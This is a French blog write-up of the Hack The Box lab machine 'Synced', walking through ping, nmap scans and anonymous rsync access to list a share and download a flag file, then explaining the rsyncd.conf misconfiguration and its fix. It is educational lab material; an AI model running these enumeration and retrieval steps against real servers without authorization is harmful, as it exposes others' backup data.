---
title: "Synced"
date: 2026-01-16
description: "Découverte d'un service de backup."
draft: false

# Tes taxonomies (correspondant à ton hugo.toml)
tags: ["Misconfiguration", "Service", "Nmap", "Rsync", "Linux", "VIP", "Tier 0"]
categories: ["Writeups", "Hack The Box", "Starting Point"]
---

# Introduction

Nous y sommes : **Synced** est la dernière étape du **Tier 0** de **Starting Point**. Après avoir exploré des bases de données et des accès à distance, on termine en beauté avec un utilitaire de transfert de fichiers extrêmement courant sous Linux : **rsync**.

>[!TIP]
Attention : Il s’agit d’une machine VIP. Vous aurez besoin d’un abonnement HTB pour pouvoir la lancer.

Cette machine illustre parfaitement comment un outil de sauvegarde, s’il est mal configuré, peut devenir une porte ouverte sur vos données. Un walkthrough officiel existe déjà sur HTB, mais voyons comment on peut “pwn” ça proprement.

>[!WARNING]
>Dans ce writeup, je ne publie pas directement le flag final, l’objectif est d’apprendre en pratiquant. Si vous voulez le flag, suivez les étapes sur la machine.

>[!CAUTION]
>**NOTE :** n’attaquez que des machines sur lesquelles vous avez l’autorisation (ex. machines HTB, ou lab perso). Respectez les règles de la plateforme.

## Vidéo Walkthrough

Je sortirais bientot un tuto vidéo, d'ici la tu peux aller checker ma chaine Youtube
{{< button href="https://www.youtube.com/@Raven_Breach/videos" target="_blank" >}}
{{< icon "youtube" >}} RavenBreach
{{< /button >}}

---

## Reconnaissance
### Découverte d’hôte
On commence par l’habituel ``ping`` pour confirmer que la cible est en ligne.
````bash
┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.7]─[ravenbreach@htb-x1aifxhwrs]─[~]
└──╼ [★]$ ping 10.129.8.119

PING 10.129.8.119 (10.129.8.119) 56(84) bytes of data.
64 bytes from 10.129.8.119: icmp_seq=1 ttl=63 time=8.33 ms
64 bytes from 10.129.8.119: icmp_seq=2 ttl=63 time=7.88 ms
64 bytes from 10.129.8.119: icmp_seq=3 ttl=63 time=8.21 ms
^C
--- 10.129.8.119 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 7.878/8.137/8.326/0.189 ms
````
La machine répond, elle est prête pour le scan.

### Énumération des services
Lançons un scan ``nmap`` pour identifier les services ouverts. On commence par les **ports standards**.

````bash
┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.7]─[ravenbreach@htb-x1aifxhwrs]─[~]
└──╼ [★]$ nmap -sV 10.129.8.119

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-12 08:26 CST
Nmap scan report for 10.129.8.119
Host is up (0.0088s latency).
Not shown: 999 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.98 seconds
````
On constate que seul le port **873** est ouvert. Le service qui tourne est ``rsync``.

**C’est quoi rsync** ? C’est un outil de synchronisation et de transfert de fichiers. Son grand avantage est qu’il ne transfère que les parties modifiées des fichiers (système de “delta”). Il est massivement utilisé pour les backups de serveurs.

Tentons un scan plus détaillé sur le port **873** graçe a l’option ``-p873`` avec les scripts par défaut (``-sC``) pour voir si on peut glaner des infos supplémentaires.

````bash
┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.7]─[ravenbreach@htb-x1aifxhwrs]─[~]
└──╼ [★]$ nmap -p873 -sC -sV 10.129.8.119

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-12 08:29 CST
Nmap scan report for 10.129.8.119
Host is up (0.0081s latency).

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.52 seconds
````
Rien de plus ici, il va falloir interagir directement avec le service.

---

## Pré-Exploitation

### Evaluation de vulnérabilité

Parfois, **rsync** est configuré pour accepter des connexions anonymes (sans mot de passe), ce qui est une très mauvaise pratique. Nous allons tester cela.

Pour lister les répertoires (**shares**) disponibles en anonyme, on utilise l’option ``--list-only`` et on ne précise pas d'utilisateur avant l'**IP** (on utilise le double deux-points ``::`` pour signifier qu'on interroge le démon ``rsync``).

````bash
┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.7]─[ravenbreach@htb-x1aifxhwrs]─[~]
└──╼ [★]$ rsync --list-only 10.129.8.119::

public          Anonymous Share
````
Jackpot ! Le service nous répond et nous montre un partage nommé **public** avec la description explicite **Anonymous Share**.

---

## Exploitation

### Exploration du dossier
Regardons maintenant ce qui se cache à l’intérieur de ce dossier **public**. On utilise la même commande que plus tôt, mais on précise le dossier après le double deux-point ``::``.
````bash
┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.7]─[ravenbreach@htb-x1aifxhwrs]─[~]
└──╼ [★]$ rsync --list-only 10.129.8.119::public

drwxr-xr-x          4,096 2022/10/24 17:02:23 .
-rw-r--r--             33 2022/10/24 16:32:03 flag.txt
````
On voit un fichier **flag.txt**. Il ne reste plus qu’à le récupérer !

### Récupération du flag
Pour copier le fichier de la cible vers notre machine locale, on utilise la syntaxe suivante ``rsync [Source] [Destination]`` 
````bash
┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.7]─[ravenbreach@htb-x1aifxhwrs]─[~]
└──╼ [★]$ rsync 10.129.8.119::public/flag.txt flag.txt
````
Une fois le transfert terminé, on vérifie le contenu du fichier sur notre machine
````bash
┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.7]─[ravenbreach@htb-x1aifxhwrs]─[~]
└──╼ [★]$ cat flag.txt 

72e{...}519
````
Le flag est lu, mission accomplie !

---

## Post-Exploitation

La faille ici résidait dans le fichier de configuration **/etc/rsyncd.conf**. En autorisant l’accès sans authentification à un module, l’administrateur a transformé son outil de sauvegarde en serveur de fichiers public.

La leçon a retenir est de ne jamais exposer rsync sans authentification (paramètre auth users) et restreindre l’accès par IP pour que seuls les serveurs de backup autorisés puissent se connecter.

La machine est ***pwn*** !